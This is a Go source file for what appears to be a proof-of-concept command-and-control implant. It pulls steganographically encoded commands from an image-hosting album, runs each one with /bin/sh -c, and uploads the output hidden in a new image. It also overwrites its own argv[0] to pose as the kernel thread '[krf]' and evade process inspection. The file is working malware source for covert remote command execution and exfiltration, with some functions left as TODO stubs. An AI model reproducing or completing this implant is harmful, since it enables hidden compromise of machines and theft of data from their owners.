package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"unsafe"

	// Internal libs
	"github.com/AntiMatter/cmd"

	// External libs
	"github.com/fatih/color"
)

var clientOptions = map[string]string{"ClientID": "", "AlbumID": ""}
var imageMem string

/*
TODO:
- Client needs to be configured to know what album to grab from
	- This is probably gonna be done through the description words, how can you preconfigure this??
- Once you get past the first part, it needs to be able to grab the tasking image from the album
- Decode it the command
- Run it
- Encode the result in a new image
- And upload a new image into the same album


*/

// ChangeProcName is a function that hooks argv[0] and renames it
// This will stand out to filesystem analysis such as lsof and the /proc directory
func ChangeProcName(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}

	return nil
}

// getTasking is the client grabbing the tasking configured for it
func getTasking(albumID string, clientID string) (out []uint8) {
	clientID = clientOptions["ClientID"]

	linkImage := cmd.GetLinkClient(albumID, clientID)

	response, e := http.Get(linkImage)
	if e != nil {
		log.Print(e)
	}
	defer response.Body.Close()

	contents, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
	}
	//fmt.Println(string(contents))
	imageMem = string(contents)

	fmt.Println(color.GreenString("Response") + ":")
	fmt.Println(" ")

	// returns the decoded message
	task := cmd.DecodeImage(contents)
	fmt.Println(task)
	fmt.Println(" ")
	out, err = exec.Command("/bin/sh", "-c", task).Output()
	if err != nil {
		fmt.Println("Error running commmand: ", err)
	}

	return out

}

// decodeImage will decode the tasking image, and then run the command and grab the output, store it somewhere as a return value maybe?
func decodeImage() {

}

// encodeOutput will take the command output and encode it into another image (in memory?) and upload it to the configured album
func encodeOutput() {
	out := getTasking(clientOptions["AlbumID"], clientOptions["ClientID"])
	fmt.Println(color.GreenString("Output:"))
	fmt.Println(" ")
	fmt.Printf("%s", out)
	fmt.Println(" ")

	fmt.Print("Please enter the Album-DeleteHash to upload response to >> ")
	reader := bufio.NewReader(os.Stdin)
	albumDeleteHash, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}
	albumDeleteHash = strings.TrimSuffix(albumDeleteHash, "\n")
	cmd.UploadImage(imageMem, "Response", albumDeleteHash, "Within this is a response", clientOptions["ClientID"])

}

func main() {

	// Keep in mind the binary name has to be at least as long if not longer than your desired name
	err := ChangeProcName("[krf]")
	if err != nil {
		fmt.Println(err.Error())
	}

	albumID := flag.String("album-id", "", "The album ID to retrieve tasking and upload responses")

	flag.Parse()

	fmt.Println("This is the client PoC...")
	fmt.Print("Please enter the Client-ID >> ")

	reader := bufio.NewReader(os.Stdin)
	// ReadString will block until the delim is entered
	clientID, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("An error occured while reading input: ", err)
		os.Exit(1)
	}
	// Remove the delim from the string
	clientID = strings.TrimSuffix(clientID, "\n")

	clientOptions["ClientID"] = clientID

	// Check to see if the flag was set or not, if not then prompt user to enter value
	if *albumID == "" {
		fmt.Print("Please enter the AlbumID >> ")
		albumID, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("An error occured while reading input: ", err)
			os.Exit(1)
		}
		albumID = strings.TrimSuffix(albumID, "\n")

		clientOptions["AlbumID"] = albumID
	} else {
		clientOptions["AlbumID"] = *albumID
	}
	encodeOutput()
}
